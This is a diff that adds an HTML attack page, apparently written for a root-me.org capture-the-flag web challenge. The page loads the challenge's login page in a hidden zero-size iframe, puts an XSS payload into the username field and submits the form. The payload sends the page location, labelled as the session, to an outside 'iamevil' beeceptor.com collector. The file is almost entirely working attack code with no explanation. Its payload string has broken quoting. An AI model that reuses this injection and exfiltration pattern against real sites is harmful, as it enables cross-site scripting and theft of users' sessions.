@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Redirect and Inject Payload</title>
+    <meta charset="UTF-8">
+    <script>
+        // Redirect to the target page
+        window.onload = function () {
+            const targetURL = "http://challenge01.root-me.org:58003/login";
+            const payload = "<img src=x onerror="window.location='https://iamevil.free.beeceptor.com/?session='+document.location"/>";
+
+            // Create a hidden iframe to interact with the target page
+            const iframe = document.createElement('iframe');
+            iframe.src = targetURL;
+            iframe.style.width = '0';
+            iframe.style.height = '0';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+
+            // Wait for the iframe to load, then inject the payload and submit the form
+            iframe.onload = function () {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const usernameField = iframeDoc.getElementById('username');
+                const form = iframeDoc.querySelector('form');
+
+                if (usernameField && form) {
+                    usernameField.value = payload; // Inject the payload
+                    form.submit(); // Submit the form
+                }
+            };
+        };
+    </script>
+</head>
+<body>
+    <h1>Redirect and Inject Payload</h1>
+    <p>If nothing happens, please enable JavaScript in your browser.</p>
+</body>
+</html>
